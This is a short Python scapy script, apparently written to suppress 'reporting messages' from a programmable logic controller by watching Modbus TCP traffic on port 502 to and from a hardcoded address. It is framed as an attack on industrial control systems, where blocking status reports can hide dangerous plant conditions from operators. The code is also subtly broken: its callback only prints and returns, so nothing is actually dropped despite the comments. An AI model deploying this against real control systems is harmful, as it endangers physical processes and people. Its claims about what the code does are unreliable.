from scapy.all import *
import sys
import time

# Function to find the PLC's IP address
def find_plc_ip():
    # Implement a method to discover the PLC's IP address
    # This could be done by scanning the network for devices responding to specific protocols
    # For simplicity, we assume the IP address is known or hardcoded
    plc_ip = "192.168.1.10"  # Replace with actual IP or discovery logic
    return plc_ip

# Function to block reporting messages
def block_reporting_messages(plc_ip):
    # Define the filter to capture reporting messages (e.g., Modbus TCP)
    filter_str = f"tcp and host {plc_ip}"

    def packet_callback(packet):
        # Check if the packet is a reporting message
        if packet.haslayer(TCP) and packet[TCP].dport == 502:  # Modbus TCP uses port 502
            print(f"Blocking reporting message from {packet[IP].src} to {packet[IP].dst}")
            # Drop the packet by not sending it further
            return

    # Start sniffing the network and apply the callback function
    sniff(filter=filter_str, prn=packet_callback, store=0)

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    print(f"Found PLC IP: {plc_ip}")

    # Step 2: Block reporting messages
    print("Starting to block reporting messages...")
    try:
        block_reporting_messages(plc_ip)
    except KeyboardInterrupt:
        print("Stopping the script...")
        sys.exit(0)